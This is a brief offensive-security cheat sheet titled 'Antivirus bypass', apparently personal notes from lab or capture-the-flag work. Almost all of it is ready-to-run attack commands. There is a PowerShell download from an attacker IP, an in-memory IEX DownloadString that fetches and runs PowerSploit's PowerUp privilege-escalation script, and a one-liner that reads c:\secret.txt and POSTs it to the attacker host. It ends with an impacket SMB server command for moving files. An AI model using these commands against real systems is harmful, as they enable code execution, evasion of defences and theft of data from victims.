# Antivirus bypass

## powershell
- Disable CLM : 
- Use it to transfert files

```
powershell "Invoke-WebRequest 'http://10.10.14.26/wmic_info.bat' -OutFile c:\Users\Public\wmic_info.bat" 2>&1
```

Load script on the fly : 

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.26/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks
```

Data exfiltration :

```
$body = Get-Content 'c:\secret.txt'"'"';Invoke-WebRequest http://10.10.14.26:443 -Body $body -Method 'POST'
```

## SMB

Use smb with auth when anon smb disallowed :

```
impacket-smbserver -username user -password '' -smb2support kali .
```


